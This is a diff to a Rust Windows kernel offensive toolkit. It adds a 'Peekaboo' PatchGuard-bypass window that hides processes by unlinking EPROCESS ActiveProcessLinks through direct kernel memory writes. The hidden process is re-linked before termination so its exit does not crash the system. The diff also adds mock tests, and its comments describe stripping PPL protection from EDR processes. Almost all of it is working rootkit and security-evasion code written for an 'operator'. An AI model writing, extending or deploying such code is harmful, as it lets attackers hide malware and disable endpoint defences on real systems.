@@ -6,11 +6,16 @@
 //! - [`PplStripper`] (`PplKit`): zero an EPROCESS's `Protection.Level` (+ the
 //!   `SignatureLevel`/`SectionSignatureLevel` neighbours) to strip PPL from an
 //!   EDR process. Data-only, HVCI-safe.
-//! - PatchGuard windows ([`TimingRepairWindow`] / [`RuntimePgBypassWindow`]):
-//!   the two real PG-bypass families, selected at runtime by
-//!   [`crate::win::select_pg_window`]. No skeleton base — selection is
-//!   capability-driven (`supports_thread_suspend` flag + PG-context offsets
-//!   table) and returns `None` when no window is available for the build.
+//! - PatchGuard windows ([`PeekabooWindow`] / [`RuntimePgBypassWindow`] /
+//!   [`TimingRepairWindow`]): the three PG-bypass strategies, selected at
+//!   runtime by [`crate::win::select_pg_window_with_probe`] in priority order
+//!   (Peekaboo — offset-free, preferred > RuntimePgBypass > TimingRepair). No
+//!   skeleton base — selection is capability-driven (`PeekabooProbe` seam +
+//!   `supports_thread_suspend` flag + PG-context offsets table) and returns
+//!   `None` when no window is available for the build. [`PeekabooWindow`] is
+//!   the offset-free alternative (Outflank Peekaboo timing repair): it
+//!   consumes only PDB-resolved EPROCESS offsets, so it is NOT blocked by the
+//!   verified-offsets gate.
 //!   ⚠ EXPERIMENTAL (kernelsdk-1-1): the PG-context table rows are
 //!   PLACEHOLDER offsets (0x190/0x08, never PDB-verified), so `select_pg_window`
 //!   is gated OFF (returns `None`) until a row flips `PgContextOffsets::verified`.
@@ -237,11 +242,14 @@ impl PplKit for PplStripper {
 
 // ---- §3.1/3.2 PatchGuardKit -----------------------------------------------
 
-/// PatchGuard window state. Two implementations:
-/// 1. [`TimingRepairWindow`] — Outflank-style, all builds (short window <1s)
+/// PatchGuard window state. Three implementations:
+/// 1. [`TimingRepairWindow`] — valid-flag gap, all builds (short window <1s)
 /// 2. [`RuntimePgBypassWindow`] — kurasagi-style, Win11 24H2+ (long window)
+/// 3. [`PeekabooWindow`] — Outflank Peekaboo timing repair (offset-free, all
+///    builds; repairs at the PspProcessDelete validation instead of touching
+///    the PG context)
 ///
-// ---- §3.1a TimingRepairWindow — Outflank Peekaboo style (all builds) ------
+// ---- §3.1a TimingRepairWindow — valid-flag gap (all builds) ---------------
 //
 // The timing-repair approach works on ALL Windows versions by exploiting the
 // gap between two consecutive PatchGuard validation cycles (~5 minutes apart).
@@ -254,7 +262,7 @@ impl PplKit for PplStripper {
 // This gives a short window (<1s) where DKOM edits won't be caught by PG.
 // The operator must complete all edits while the guard is alive.
 
-/// Outflank-style timing repair window. Works on all builds by reading the
+/// Timing repair window (valid-flag gap). Works on all builds by reading the
 /// PG context valid flag and performing edits during the gap between validation
 /// cycles. Short window (<1s) — the operator must complete DKOM edits quickly.
 ///
@@ -338,7 +346,7 @@ impl<'a> PatchGuardKit for TimingRepairWindow<'a> {
         //      the next validation cycle after we release).
         //    - Disarms the window.
         //
-        //    In a full Outflank Peekaboo impl, the repair also:
+        //    In a complete timing-repair driver, the repair also:
         //    - Unregisters the terminate-callback hook that intercepted
         //      PspProcessDelete to trigger PG restart.
         //    - Restores any modified PG context fields.
@@ -474,6 +482,259 @@ impl<'a> PatchGuardKit for RuntimePgBypassWindow<'a> {
             // SAFETY: we hold &self and the PgGuard borrows self, so no
             // other PgGuard can be live. The store is atomic.
             unsafe { &*armed_ref }.store(false, core::sync::atomic::Ordering::Release);
+        }))
+    }
+}
+
+// ---- §3.1c PeekabooWindow — Outflank Peekaboo style (offset-free) ---------
+//
+// Peekaboo (Outflank, Ksawery Czapczyński, 2026-01) defeats the crash path of
+// DKOM-hidden processes WITHOUT touching the PatchGuard context at all:
+//
+// 1. PatchGuard's periodic scans do NOT checksum ActiveProcessLinks. The real
+//    crash vector is process TERMINATION: nt!PspProcessDelete validates the
+//    terminating EPROCESS's LIST_ENTRY bidirectional consistency
+//    (Flink->Blink == entry && Blink->Flink == entry) and fast-fails
+//    (int 29h → 0x139 KERNEL_SECURITY_CHECK_FAILURE) on mismatch.
+// 2. A PsSetCreateProcessNotifyRoutineEx callback fires BEFORE PspProcessDelete
+//    runs. In that timing window the driver re-links the neighbors'
+//    cross-pointers back at the hidden entry, so the validation sees a
+//    consistent list — the process was hidden for its whole lifetime but
+//    terminates cleanly.
+//
+// Offset footprint: only EPROCESS.ActiveProcessLinks (already PDB-resolved via
+// crate::offsets) — ZERO PG-context offsets, so unlike the other two windows
+// this path is NOT blocked by the kernelsdk-1-1 verified-offsets gate. All
+// operations are data-only (HVCI-safe). Works on every build where the notify
+// callback fires before PspProcessDelete (all supported Windows versions).
+//
+// Capability probe order for the three window families (the actual selection
+// lives in win::select_pg_window; documented here as the operator contract):
+//   1. PeekabooWindow — preferred: offset-free + HVCI-safe, all builds; needs
+//      a kernel callback seam (a PeekabooProbe impl: signed driver running a
+//      PsSetCreateProcessNotifyRoutineEx callback).
+//   2. RuntimePgBypassWindow — Win11 24H2+ long window; needs VERIFIED
+//      PG-context offsets (gated OFF until a table row flips `verified`).
+//   3. TimingRepairWindow — all builds, short window; same verified-offsets gate.
+
+/// Observation point for LIST_ENTRY validation triggers — the ONLY
+/// kernel-interaction seam of the Peekaboo path (kept behind a trait so the
+/// timing/window logic stays host-testable with a mock).
+///
+/// Real impl (operator-side driver): registers a
+/// PsSetCreateProcessNotifyRoutineEx callback; when a guarded process
+/// terminates (CreateInfo == NULL) the callback fires before
+/// nt!PspProcessDelete's LIST_ENTRY validation — that is the repair window,
+/// and the callback performs [`PeekabooWindow::repair_links`] for the
+/// terminating EPROCESS.
+pub trait PeekabooProbe {
+    /// Whether a LIST_ENTRY validation (PspProcessDelete) is executing or
+    /// imminent THIS INSTANT for a guarded entry. `true` = the window must
+    /// refuse to open — editing mid-validation races the fast-fail check.
+    fn validation_active(&self) -> Result<bool, KitError>;
+
+    /// Whether the repair-at-termination path is armed (notify callback
+    /// registered). Without it, hiding a process guarantees a 0x139 bugcheck
+    /// on process exit — the window must refuse to open.
+    fn repair_armed(&self) -> Result<bool, KitError>;
+}
+
+/// Entry decision for the Peekaboo window — pure function of probe state.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PeekabooDecision {
+    /// Window may open: no validation executing, repair callback armed.
+    Enter,
+    /// Refuse: a validation is executing right now. Retry after
+    /// PspProcessDelete completes. Checked FIRST — a racing validation
+    /// dominates even an armed repair path.
+    RefuseValidationActive,
+    /// Refuse: the termination-callback repair path is not armed — opening
+    /// the window would allow a hide that bugchecks on process exit.
+    RefuseRepairNotArmed,
+}
+
+/// Pure timing decision: may the Peekaboo unchecked window open?
+pub fn peekaboo_entry_decision(validation_active: bool, repair_armed: bool) -> PeekabooDecision {
+    if validation_active {
+        PeekabooDecision::RefuseValidationActive
+    } else if !repair_armed {
+        PeekabooDecision::RefuseRepairNotArmed
+    } else {
+        PeekabooDecision::Enter
+    }
+}
+
+/// Outflank Peekaboo-style window. Covers DKOM edits by contract: the caller
+/// hides entries with [`PeekabooWindow::unlink_preserving_links`] + tracks
+/// them via [`PeekabooWindow::track_hidden`]; the guard's Drop (and, on a
+/// real driver, the notify callback at process termination) re-links the
+/// neighbors' cross-pointers so PspProcessDelete's consistency check passes.
+///
+/// # vs. the valid_flag-zeroing windows
+/// `TimingRepairWindow` / `RuntimePgBypassWindow` gamble on UNVERIFIED
+/// PG-context offsets (a bugcheck lottery while the table rows are
+/// placeholders) and only suppress the periodic PG scan — they do nothing
+/// about the PspProcessDelete termination check. Peekaboo inverts this: zero
+/// PG offsets, repair exactly at the one validation that actually fires for
+/// DKOM. The trade-off: it needs a kernel callback seam (signed driver)
+/// instead of pure kernel r/w, and it does NOT cover tampering that the
+/// periodic PG scan DOES checksum (SSDT/IDT/GDT/code pages) — use it for
+/// ActiveProcessLinks-class data edits only.
+///
+/// # Safety contract
+/// Same as the other windows: do not hold the guard across a sleep/block.
+/// All edits inside the window MUST use [`Self::unlink_preserving_links`]
+/// (NOT [`ProcessHider::unlink`] — its self-loop finalizer erases the
+/// neighbor pointers the repair needs).
+pub struct PeekabooWindow<'a> {
+    /// Build-resolved EPROCESS offsets (the PDB-verified path — the only
+    /// offsets this window consumes).
+    offsets: EprocessOffsets,
+    /// Validation-trigger observation seam (real: notify-callback driver).
+    probe: &'a dyn PeekabooProbe,
+    /// Whether the window is currently open.
+    armed: core::sync::atomic::AtomicBool,
+    /// Link KVAs of entries hidden inside this window, repaired on Drop.
+    /// RefCell matches the single-threaded operator context of the other
+    /// windows (RuntimePgBypassWindow uses Cell the same way).
+    hidden: core::cell::RefCell<alloc::vec::Vec<usize>>,
+    /// Kernel R/W reference held for the repair callback.
+    krw: &'a dyn KernelRw,
+}
+
+impl<'a> PeekabooWindow<'a> {
+    /// Create a new Peekaboo window. `krw` is stored for the repair callback —
+    /// it must outlive any [`crate::PgGuard`] returned by
+    /// [`PatchGuardKit::enter_unchecked`].
+    pub fn new(
+        offsets: EprocessOffsets,
+        probe: &'a dyn PeekabooProbe,
+        krw: &'a dyn KernelRw,
+    ) -> Self {
+        Self {
+            offsets,
+            probe,
+            armed: core::sync::atomic::AtomicBool::new(false),
+            hidden: core::cell::RefCell::new(alloc::vec::Vec::new()),
+            krw,
+        }
+    }
+
+    /// Register an EPROCESS hidden inside this window for repair on Drop.
+    /// Call after [`Self::unlink_preserving_links`].
+    pub fn track_hidden(&self, eprocess_kva: usize) {
+        self.hidden
+            .borrow_mut()
+            .push(eprocess_kva + self.offsets.active_process_links);
+    }
+
+    /// Peekaboo-style unlink: remove `eprocess_kva` from the active-process
+    /// list WITHOUT self-looping the victim — the victim's Flink/Blink keep
+    /// pointing at its (former) neighbors so [`Self::repair_links`] can
+    /// re-insert it before PspProcessDelete validates.
+    ///
+    /// This differs from [`ProcessHider::unlink`], whose self-loop finalizer
+    /// erases exactly the pointers the repair needs. PG's periodic scan does
+    /// not checksum ActiveProcessLinks, so the stale in-EPROCESS pointers are
+    /// not themselves a detection vector.
+    pub fn unlink_preserving_links(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        offsets: &EprocessOffsets,
+    ) -> Result<(), KitError> {
+        let link_kva = eprocess_kva + offsets.active_process_links;
+        if link_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical link KVA — corrupted EPROCESS base",
+            ));
+        }
+        let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
+        let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
+        if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical pointer",
+            ));
+        }
+        // blink->Flink = flink ; flink->Blink = blink — the victim's OWN
+        // Flink/Blink are left untouched (the Peekaboo repair needs them).
+        krw.kwrite_u64(blink, flink as u64)
+            .map_err(KitError::from)?;
+        krw.kwrite_u64(flink + 8, blink as u64)
+            .map_err(KitError::from)?;
+        Ok(())
+    }
+
+    /// The Peekaboo repair: re-insert a hidden entry between its stale
+    /// neighbors so PspProcessDelete's bidirectional consistency check
+    /// (`Flink->Blink == entry && Blink->Flink == entry`) passes. Data-only,
+    /// HVCI-safe, idempotent once the entry is re-linked.
+    ///
+    /// Expects the entry's Flink/Blink to still reference the former
+    /// neighbors — i.e. the entry was hidden with
+    /// [`Self::unlink_preserving_links`], not [`ProcessHider::unlink`].
+    pub fn repair_links(krw: &dyn KernelRw, link_kva: usize) -> Result<(), KitError> {
+        if link_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical link KVA — corrupted EPROCESS base",
+            ));
+        }
+        let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
+        let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
+        if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical pointer — entry was not hidden \
+                 with unlink_preserving_links",
+            ));
+        }
+        // next.Blink = entry ; prev.Flink = entry — exactly the Outflank
+        // repair (*FlinkBlink = OurListEntry ; *BlinkFlink = OurListEntry).
+        krw.kwrite_u64(flink + 8, link_kva as u64)
+            .map_err(KitError::from)?;
+        krw.kwrite_u64(blink, link_kva as u64)
+            .map_err(KitError::from)?;
+        Ok(())
+    }
+}
+
+impl<'a> PatchGuardKit for PeekabooWindow<'a> {
+    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
+        let krw = self.krw;
+
+        // 1. Probe the validation-trigger state; the entry decision is pure.
+        let decision =
+            peekaboo_entry_decision(self.probe.validation_active()?, self.probe.repair_armed()?);
+        match decision {
+            PeekabooDecision::Enter => {}
+            PeekabooDecision::RefuseValidationActive => {
+                return Err(KitError::UnsupportedPosture(
+                    "PeekabooWindow: LIST_ENTRY validation in progress — \
+                     retry after PspProcessDelete completes",
+                ));
+            }
+            PeekabooDecision::RefuseRepairNotArmed => {
+                return Err(KitError::UnsupportedPosture(
+                    "PeekabooWindow: termination-callback repair not armed — \
+                     hiding without it guarantees a 0x139 on process exit",
+                ));
+            }
+        }
+
+        // 2. Arm.
+        self.armed
+            .store(true, core::sync::atomic::Ordering::Release);
+
+        // 3. Return the PgGuard. The Drop repair:
+        //    - Re-links every entry hidden inside this window (on a real
+        //      driver the notify callback performs the same repair
+        //      per-process at termination; Drop covers window exit).
+        //    - Disarms the window.
+        Ok(crate::PgGuard::new(self, move || {
+            let links = self.hidden.take();
+            for link_kva in links {
+                let _ = Self::repair_links(krw, link_kva);
+            }
+            self.armed
+                .store(false, core::sync::atomic::Ordering::Release);
         }))
     }
 }
@@ -721,6 +982,154 @@ mod tests {
         let guard = kit.enter_unchecked(&krw);
         assert!(guard.is_ok());
         drop(guard);
+    }
+
+    // ---- PeekabooWindow tests (offset-free Outflank Peekaboo path) ----
+
+    /// Mock validation-trigger probe (stands in for the real
+    /// PsSetCreateProcessNotifyRoutineEx-callback driver seam).
+    struct MockProbe {
+        active: bool,
+        armed: bool,
+    }
+    impl PeekabooProbe for MockProbe {
+        fn validation_active(&self) -> Result<bool, KitError> {
+            Ok(self.active)
+        }
+        fn repair_armed(&self) -> Result<bool, KitError> {
+            Ok(self.armed)
+        }
+    }
+
+    /// Helper: build a 2-process active list (head ↔ e1 ↔ e2 ↔ head) and
+    /// return (head, e1, e2, l1, l2). All kernel-canonical addresses.
+    fn setup_two_process_list(krw: &MockKrw, offsets: &EprocessOffsets) -> [usize; 5] {
+        let head = 0xFFFF_8000_0000_1000usize;
+        let e1 = 0xFFFF_8000_0000_5000usize;
+        let e2 = 0xFFFF_8000_0000_6000usize;
+        let l1 = e1 + offsets.active_process_links;
+        let l2 = e2 + offsets.active_process_links;
+        krw.set_u64(head, l1 as u64);
+        krw.set_u64(l1, l2 as u64);
+        krw.set_u64(l1 + 8, head as u64);
+        krw.set_u64(l2, head as u64);
+        krw.set_u64(l2 + 8, l1 as u64);
+        [head, e1, e2, l1, l2]
+    }
+
+    #[test]
+    fn peekaboo_decision_matrix() {
+        use PeekabooDecision::*;
+        assert_eq!(peekaboo_entry_decision(false, true), Enter);
+        assert_eq!(peekaboo_entry_decision(true, true), RefuseValidationActive);
+        assert_eq!(peekaboo_entry_decision(false, false), RefuseRepairNotArmed);
+        // A racing validation dominates even an armed repair path.
+        assert_eq!(peekaboo_entry_decision(true, false), RefuseValidationActive);
+    }
+
+    #[test]
+    fn peekaboo_unlink_hides_but_preserves_neighbor_pointers() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let [head, e1, _e2, l1, l2] = setup_two_process_list(&krw, &offsets);
+
+        PeekabooWindow::unlink_preserving_links(&krw, e1, &offsets).unwrap();
+        // Neighbors bypass the victim (the process is hidden)…
+        assert_eq!(krw.get_u64(head), l2 as u64);
+        assert_eq!(krw.get_u64(l2 + 8), head as u64);
+        // …but the victim's OWN Flink/Blink still point at the former
+        // neighbors — unlike ProcessHider::unlink's self-loop finalizer.
+        assert_eq!(krw.get_u64(l1), l2 as u64);
+        assert_eq!(krw.get_u64(l1 + 8), head as u64);
+    }
+
+    #[test]
+    fn peekaboo_repair_restores_list_consistency() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let [head, e1, _e2, l1, l2] = setup_two_process_list(&krw, &offsets);
+
+        PeekabooWindow::unlink_preserving_links(&krw, e1, &offsets).unwrap();
+        // Mid-window the list is inconsistent (PspProcessDelete would 0x139):
+        // next.Blink != entry && prev.Flink != entry.
+        assert_ne!(krw.get_u64(l2 + 8), l1 as u64);
+        assert_ne!(krw.get_u64(head), l1 as u64);
+
+        PeekabooWindow::repair_links(&krw, l1).unwrap();
+        // After repair, PspProcessDelete's check passes:
+        // Flink->Blink == entry && Blink->Flink == entry.
+        let flink = krw.get_u64(l1) as usize;
+        let blink = krw.get_u64(l1 + 8) as usize;
+        assert_eq!(krw.get_u64(flink + 8), l1 as u64);
+        assert_eq!(krw.get_u64(blink), l1 as u64);
+        // The full list is walkable again: head → l1 → l2 → head.
+        assert_eq!(krw.get_u64(head), l1 as u64);
+        assert_eq!(krw.get_u64(l1), l2 as u64);
+        assert_eq!(krw.get_u64(l2), head as u64);
+    }
+
+    #[test]
+    fn peekaboo_repair_rejects_noncanonical() {
+        let krw = MockKrw::new();
+        assert!(matches!(
+            PeekabooWindow::repair_links(&krw, 0x1000),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn peekaboo_window_refuses_during_active_validation() {
+        let krw = MockKrw::new();
+        let probe = MockProbe {
+            active: true,
+            armed: true,
+        };
+        let kit = PeekabooWindow::new(test_offsets(), &probe, &krw);
+        assert!(matches!(
+            kit.enter_unchecked(&krw),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn peekaboo_window_refuses_without_armed_repair() {
+        let krw = MockKrw::new();
+        let probe = MockProbe {
+            active: false,
+            armed: false,
+        };
+        let kit = PeekabooWindow::new(test_offsets(), &probe, &krw);
+        assert!(matches!(
+            kit.enter_unchecked(&krw),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn peekaboo_window_drop_repairs_hidden_entry() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let [head, e1, _e2, l1, l2] = setup_two_process_list(&krw, &offsets);
+        let probe = MockProbe {
+            active: false,
+            armed: true,
+        };
+        let kit = PeekabooWindow::new(offsets, &probe, &krw);
+        {
+            let guard = kit.enter_unchecked(&krw).expect("window opens");
+            assert!(guard.repair.is_some());
+            // Hide e1 INSIDE the window (Peekaboo-style unlink + tracking).
+            PeekabooWindow::unlink_preserving_links(&krw, e1, &offsets).unwrap();
+            kit.track_hidden(e1);
+            // Mid-window: victim hidden, list inconsistent.
+            assert_eq!(krw.get_u64(head), l2 as u64);
+            assert_eq!(krw.get_u64(l2 + 8), head as u64);
+        } // guard dropped → repair callback fires
+          // After Drop: e1 re-linked — PspProcessDelete's check would pass.
+        assert_eq!(krw.get_u64(head), l1 as u64);
+        assert_eq!(krw.get_u64(l2 + 8), l1 as u64);
+        assert_eq!(krw.get_u64(l1), l2 as u64);
+        assert_eq!(krw.get_u64(l1 + 8), head as u64);
     }
 
     #[test]
